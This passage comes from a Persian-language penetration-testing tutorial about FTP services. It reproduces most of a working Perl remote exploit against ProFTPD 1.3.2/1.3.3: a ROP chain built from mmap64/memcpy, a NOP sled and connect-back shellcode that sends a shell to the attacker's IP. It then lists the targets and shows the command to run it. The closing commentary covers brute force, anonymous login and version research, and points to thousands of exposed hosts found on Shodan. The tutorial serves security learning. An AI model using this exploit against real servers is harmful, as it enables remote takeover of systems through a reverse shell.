		if (($v = index $buff, "\x8B\x55\x10\x89\x74\x24\x04\x89\x04\x24\x89\x54\x24\x08") >= 0) {
			$addr1 = $k+$v+18;
			$memcpy = unpack("I", substr($buff, $v+15, 4));
			$memcpy = $addr1 - (0xffffffff-$memcpy);
			printf "memcpy is located at %08x\n", $memcpy;
		} else {

			print "Could not find memcpy()\n";
			exit;
		}
		}
		}
		}
	}

	if (($v = index $buff, "\xfc\x8b") >= 0) {
		$byte1 = $k+$v;
		printf ("byte1: %08x\n", $byte1);
	} else {
		print "Could not find a special byte\n";
		exit;
	}

	if (($v = index $buff, "\xf4") >= 0) {
		$byte2 = $k+$v;
		printf ("byte2: %08x\n", $byte2);
	} else {
		print "Could not find a special byte\n";
		exit;
	}

	if (($v = index $buff, "\xbf") >= 0) {
		$byte3 = $k+$v;
		printf ("byte3: %08x\n", $byte3);
	} else {
		print "Could not find a special byte\n";
		exit;
	}

	if (($v = index $buff, "\x00\x01\x00") >= 0) {
		$byte4 = $k+$v;
		printf ("byte4: %08x\n", $byte4);
	} else {
		print "Could not find a special byte\n";
		exit;
	}

	if (($v = index $buff, "\x10") >= 0) {
		$byte5 = $k+$v;
		printf ("byte5: %08x\n", $byte5);
	} else {
		print "Could not find a special byte\n";
		exit;
	}

	if (($v = index $buff, "\xB9\x00\x02\x00\x00") >= 0) {
		$byte6 = $k+$v;
		printf ("byte6: %08x\n", $byte6);
	} else {
		print "Could not find a special byte\n";
		exit;
	}


	if (($v = index $buff, "\xf3") >= 0) {
		$byte7 = $k+$v;
		printf ("byte7: %08x\n", $byte7);
	} else {
		print "Could not find a special byte\n";
		exit;
	}

	if (($v = index $buff, "\xA4") >= 0) {
		$byte8 = $k+$v;
		printf ("byte8: %08x\n", $byte8);
	} else {
		print "Could not find a special byte\n";
		exit;
	}

	if (($v = index $buff, "\xeb\xff") >= 0) {
		$byte9 = $k+$v;
		printf ("byte9: %08x\n", $byte9);
	} else {
		print "Could not find a special byte\n";
		exit;
	}

# shellcode copy routine:
#0100740B     FC             CLD
#0100740C     8BF4           MOV ESI,ESP
#0100740E     BF 00010010    MOV EDI,10000100
#01007413     B9 00020000    MOV ECX,200
#01007418     F3:A4          REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[>
#			  EB FF 		 JMP +0xFF
# FC 8B
# F4 BF
# 00 01 00
# 10
# B9 00 02 00 00
# F3:A4
# EB FF

# El1Te X-Ploit TechNiqUe (C)

	print "Building exploit buffer\n";

	$stack = "KCOPERULEZKCOPERULEZKC" . "C" x $padding .
			 pack("V", $mmap64). # mmap64()
			 pack("V", $largepopret). # add     esp, 20h; pop; pop
			 "\x00\x00\x00\x10". # mmap start
			 "\x00\x10\x00\x00". # mmap size
			 "\x07\x00\x00\x00". # mmap prot
			 "\x32\x00\x00\x00". # mmap flags
			 "\xff\xff\xff\xff". # mmap fd
			 "\x00\x00\x00\x00". # mmap offset
			 "\x00\x00\x00\x00". # mmap offset
			 "\x00\x00\x00\x00".
			 "\x00\x00\x00\x00".
			 "\x00\x00\x00\x00".
			 "\x00\x00\x00\x00".
			 pack("V", $memcpy). # memcpy()
			 pack("V", $pop3ret). # pop; pop; pop; retn
			 "\x00\x00\x00\x10". # destination
			 pack("V", $byte1). # origin
			 "\x02\x00\x00\x00". # number of bytes to copy

			 pack("V", $memcpy). # memcpy()
			 pack("V", $pop3ret). # pop; pop; pop; retn
			 "\x02\x00\x00\x10". # destination
			 pack("V", $byte2). # origin
			 "\x01\x00\x00\x00". # number of bytes to copy

			 pack("V", $memcpy). # memcpy()
			 pack("V", $pop3ret). # pop; pop; pop; retn
			 "\x03\x00\x00\x10". # destination
			 pack("V", $byte3). # origin
			 "\x01\x00\x00\x00". # number of bytes to copy

			 pack("V", $memcpy). # memcpy()
			 pack("V", $pop3ret). # pop; pop; pop; retn
			 "\x04\x00\x00\x10". # destination
			 pack("V", $byte4). # origin
			 "\x03\x00\x00\x00". # number of bytes to copy

			 pack("V", $memcpy). # memcpy()
			 pack("V", $pop3ret). # pop; pop; pop; retn
			 "\x07\x00\x00\x10". # destination
			 pack("V", $byte5). # origin
			 "\x01\x00\x00\x00". # number of bytes to copy

			 pack("V", $memcpy). # memcpy()
			 pack("V", $pop3ret). # pop; pop; pop; retn
			 "\x08\x00\x00\x10". # destination
			 pack("V", $byte6). # origin
			 "\x05\x00\x00\x00". # number of bytes to copy

			 pack("V", $memcpy). # memcpy()
			 pack("V", $pop3ret). # pop; pop; pop; retn
			 "\x0d\x00\x00\x10". # destination
			 pack("V", $byte7). # origin
			 "\x01\x00\x00\x00". # number of bytes to copy

			 pack("V", $memcpy). # memcpy()
			 pack("V", $pop3ret). # pop; pop; pop; retn
			 "\x0e\x00\x00\x10". # destination
			 pack("V", $byte8). # origin
			 "\x01\x00\x00\x00". # number of bytes to copy

			 pack("V", $memcpy). # memcpy()
			 pack("V", $pop3ret). # pop; pop; pop; retn
			 "\x0f\x00\x00\x10". # destination
			 pack("V", $byte9). # origin
			 "\x02\x00\x00\x00". # number of bytes to copy

			 "\x00\x00\x00\x10". # JUMP TO 0x10000000 rwxp address

			 "\x90" x 100 . $shellcode . "\x90" x 10;

	print "Sending exploit buffer!\n";

	my $sock = IO::Socket::INET->new(PeerAddr => $target,
      	                          PeerPort => 21,
           		                  Proto    => 'tcp');
	$v = <$sock>;

	print $sock "\x00" x $align . "\xff" . $stack . "\n";

	print "Check your netcat?\n";

	while(<$sock>) {
		print;
	}
}

sub usage() {
	print "written by kingcope\n";
 	print "usage:\n".
 		  "proremote.pl <target ip/host> <your ip> <target type>\n\n";
    for ($i=0; $i<$numtargets; $i++) {
  		print "\t[".$i."]\t". $targets[$i][0]. "\r\n";
    }

	exit;
}

if ($#ARGV ne 2) { usage; }

$target = $ARGV[0];
$cbip = $ARGV[1];
$ttype = $ARGV[2];

$platform = $targets[$ttype][1];
$style = $targets[$ttype][2];

($a1, $a2, $a3, $a4) = split(//, gethostbyname("$cbip"));

if ($platform eq "FreeBSD") {
	$shellcode = $bsdcbsc;
	substr($shellcode, 37, 4, $a1 . $a2 . $a3 . $a4);
} else {
if ($platform eq "Linux") {
	$shellcode = $lnxcbsc;
	substr($shellcode, 31, 4, $a1 . $a2 . $a3 . $a4);
} else {
	print "typo ?\n";
	exit;
}}

if ($style eq 0) {
	exploit1;
} else {
	exploit2;
}

print "done.\n";
exit;


```

</details>

اگه نگاهی به سورس بندازیم، می‌بینیم که این اکسپلویت تنها روی نسخه‌های زیر جواب میده:

```
[0]     FreeBSD 8.1 i386, ProFTPD 1.3.3a Server (binary)
[1]     FreeBSD 8.0/7.3/7.2 i386, ProFTPD 1.3.2a/e/c Server (binary)
[2]     Debian GNU/Linux 5.0, ProFTPD 1.3.2e Server (Plesk binary)
[3]     Debian GNU/Linux 5.0, ProFTPD 1.3.3 Server (Plesk binary)
[4]     Debian GNU/Linux 4.0, ProFTPD 1.3.2e Server (Plesk binary)
[5]     Debian Linux Squeeze/sid, ProFTPD 1.3.3a Server (distro binary)
[6]     SUSE Linux 9.3, ProFTPD 1.3.2e Server (Plesk binary)
[7]     SUSE Linux 10.0/10.3, ProFTPD 1.3.2e Server (Plesk binary)
[8]     SUSE Linux 10.2, ProFTPD 1.3.2e Server (Plesk binary)
[9]     SUSE Linux 11.0, ProFTPD 1.3.2e Server (Plesk binary)
[10]    SUSE Linux 11.1, ProFTPD 1.3.2e Server (Plesk binary)
[11]    SUSE Linux SLES 10, ProFTPD 1.3.2e Server (Plesk binary)
[12]    CentOS 5, ProFTPD 1.3.2e Server (Plesk binary)
```

که خب شامل نسخه ۱.۳.۱ ما نمیشه. همچنین می‌تونید با سینتکس `sudo perl 15449.pl 192.168.56.102 192.168.56.1 5` اکسپلویت را اجرا کنید که شامل آیپی سرور ftp، آیپی خودتون و نسخه سرویس است ( که باید از لیست انتخاب کنید ).

> [!TIP]
> من در مورد آسیب‌پذیری‌های موجود در اینترنت ( برای نسخه ۱.۳.۱ از این سرویس ) مطالعه کردم و اکسپلویت‌های مرتبط را هم تست زدم اما نتیجه‌ای از اون‌ها نگرفتم. خوبه که شما هم به دنبال آسیب‌پذیری‌های ثبت‌شده و روش‌های تست‌نفوذ به این نسخه از سرویس proFTPD باشید و اگه به نتیجه خاصی رسیدید، دراین صفحه به‌من بگید تا اون را اضافه کنم.
گفتن این نکته هم خالی از لطف نیست که همین الان، نزدیک به ۶ هزار هاست/سرور از نسخه ۱.۳.۱ این سرویس دارن استفاده می‌کنند ( براساس آمار موتورجستجوی shodan ). بنابرین یک دستور یا اکسپلویت ساده و پابلیک درحال حاضر وجود نداره، که بشه مستقیم سرور ftp با این سرویس و نسخه را مورد حمله قرار داد.

# نتیجه‌گیری
در این بخش ۳ حالت تست‌نفوذ به سرویس ftp را باهم بررسی کردیم. بروت‌فورس، که اگه زمان و یوزرنیم و پسوردلیست بزرگ و مناسبی داشته باشید، شانس موفقیت و پیدا کردن یک نام‌کاربری، رمزعبور معتبر می‌تونه بالا باشه و با تست‌کردن‌های مکرر می‌تونید نتیجه بگیرید. مبحث بعدهم درباره Anonymous login بود که دیدیم به‌صورت پیشفرض روی این سرویس و نسخه فعال نبوده. و مورد آخرهم آسیب‌پذیری‌هایی بود که ممکنه برای اون نسخه از سرویس وجود داشته باشه.
مورد سوم همیشه بهترین گزینه است. چراکه می‌تونید درموردش مطالعه کنید، اکسپلویت‌های موجود را درک و تست کنید و درنهایت یک آسیب‌پذیری در اون نسخه قدیمی پیدا و ازش استفاده کنید.
